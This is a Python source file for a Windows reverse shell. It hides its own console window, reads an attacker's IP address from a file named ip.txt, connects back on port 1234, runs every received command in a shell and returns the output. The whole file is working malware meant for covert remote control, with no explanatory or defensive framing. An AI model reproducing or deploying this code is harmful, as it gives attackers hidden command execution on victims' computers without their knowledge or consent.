import socket
import subprocess

def hiden(): # Hide console
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

hiden() #hiden

def read(): #read ip.txt (first line)
     read=open("ip.txt", "r") # put attacker ip in ip.txt
     data=read.read()
     return data


ip=read() #get ip


port=1234 #connection port

# Connection initialisation
c=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
c.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
c.connect((ip,port))
# Connection complete


while True:
     command=c.recv(1024)
     if command == b'exit':
          c.close()
          break
     else:
          proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
          output= proc.stdout.read()+proc.stderr.read() #get shell
          c.send(output)